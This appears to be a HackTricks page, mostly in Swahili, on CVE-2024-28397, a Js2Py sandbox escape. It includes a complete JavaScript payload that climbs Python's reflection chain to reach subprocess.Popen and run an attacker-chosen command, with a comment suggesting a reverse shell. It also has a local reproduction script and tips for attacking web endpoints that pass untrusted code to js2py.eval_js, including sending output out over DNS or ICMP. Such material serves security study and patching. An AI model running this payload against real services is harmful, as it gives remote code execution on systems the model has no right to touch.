# Js2Py sandbox escape (CVE-2024-28397)

{{#include ../../../banners/hacktricks-training.md}}

Js2Py hubadilisha JavaScript kuwa Python objects, kwa hivyo hata wakati `js2py.disable_pyimport()` inatumiwa, JS isiyo ya kuaminika inaweza kupitia miundo ya ndani ya Python kufikia madarasa hatari kama `subprocess.Popen`. Matoleo 20.74 yanaruhusu kutumiwa kwa primitives za reflection za Python ambazo Js2Py inaonyesha kwa vitu vya JS ili kupata RCE kutoka kwa JavaScript iliyokuwa "sandboxed".

## Primitive: pivot kutoka kwa JS object wrappers hadi Python objects

1. **Pata object inayounga mkono na Python**: `Object.getOwnPropertyNames({})` inarudisha kitu cha `dict_keys` katika muktadha wa Python.
2. **Rejesha upatikanaji wa attribute**: chukua `.__getattribute__` kutoka kwa object hiyo na iite ili kusoma attributes yoyote (mfano, `"__class__"`).
3. **Panda hadi `object`**: kutoka `<class 'dict_keys'>` soma `.__base__` ili kufikia base ya Python `object`.
4. **Orodhesha madarasa yaliyopakiwa**: iteleza `object.__subclasses__()` ili kutembea kila class tayari iliyopakiwa katika interpreter.
5. **Tafuta `subprocess.Popen`**: tafuta kwa kurudia subclasses ambapo `__module__ == "subprocess"` na `__name__ == "Popen"`.
6. **Tekeleza amri**: tengeneza Popen kwa arguments zinazoendeshwa na mshambuliaji na itumie `.communicate()` ili kukamata output.

<details>
<summary>Mfano wa payload inayotumia Js2Py kufikia subprocess.Popen</summary>
```javascript
// Replace cmd with desired payload (reverse shell / ping / etc.)
let cmd = "id";
let hacked, bymarve, n11;
let getattr, obj;

hacked = Object.getOwnPropertyNames({});            // -> dict_keys([])
bymarve = hacked.__getattribute__;
n11 = bymarve("__getattribute__");                // attribute access primitive
obj = n11("__class__").__base__;                   // pivot to <class 'object'>
getattr = obj.__getattribute__;

function findpopen(o) {
let result;
for (let i in o.__subclasses__()) {
let item = o.__subclasses__()[i];
if (item.__module__ == "subprocess" && item.__name__ == "Popen") {
return item;
}
if (item.__name__ != "type" && (result = findpopen(item))) {
return result;
}
}
}

// Popen(cmd, stdin/out/err pipes...) then .communicate() for output
n11 = findpopen(obj)(cmd, -1, null, -1, -1, -1, null, null, true).communicate();
console.log(n11);
n11; // returned to caller if framework sends eval_js result back
```
</details>

Kwa nini hili linafanya kazi: Js2Py inaonyesha wrappers za Python object kwa JS bila kuondoa `__getattribute__`, `__class__`, `__base__`, au `__subclasses__`. `disable_pyimport()` inazuia tu `pyimport` waziwazi, lakini mnyororo ulio hapo juu hauwahi kuingiza chochote kipya; unatumia tena modules na classes zilizopakiwa tayari katika memory.

## Kurudia mnyororo kwenye kompyuta ya ndani
```bash
# Js2Py 0.74 breaks on Python 3.12/3.13; pin 3.11 for testing
uv run --with js2py==0.74 --python 3.11 python - <<'PY'
import js2py
print(js2py.eval_js("Object.getOwnPropertyNames({})"))                      # dict_keys([])
print(js2py.eval_js("Object.getOwnPropertyNames({}).__getattribute__"))    # method-wrapper
print(js2py.eval_js("Object.getOwnPropertyNames({}).__getattribute__(\"__class__\")"))
print(js2py.eval_js("Object.getOwnPropertyNames({}).__getattribute__(\"__class__\").__base__"))
print(js2py.eval_js("Object.getOwnPropertyNames({}).__getattribute__(\"__class__\").__base__.__subclasses__()"))
PY
```
## Kufanya operesheni dhidi ya web sandboxes

- Kila endpoint inayolisha JS inayodhibitiwa na mshambuliaji ndani ya `js2py.eval_js` (kwa mfano, Flask `/run_code` API) ni mara moja RCE ikiwa mtumiaji wa process ana ufikiaji wa shell.
- Kurudisha `jsonify({'result': result})` kutashindwa wakati `.communicate()` inarudisha bytes; fanya decode au tuma output moja kwa moja kwa DNS/ICMP ili kuepuka vikwazo vya serialization.
- `disable_pyimport()` **haitoshi** kukomesha mnyororo huu; hard isolation (separate process/container) au kuondoa uendeshaaji wa Js2Py kwa code isiyoaminika inahitajika.

## Marejeo

- [HTB: CodeTwo write-up (Js2Py CVE-2024-28397 escape)](https://0xdf.gitlab.io/2026/01/31/htb-codetwo.html)
- [Marven11 CVE-2024-28397 Js2Py sandbox escape PoC](https://github.com/Marven11/CVE-2024-28397-js2py-Sandbox-Escape/blob/main/poc.py)

{{#include ../../../banners/hacktricks-training.md}}
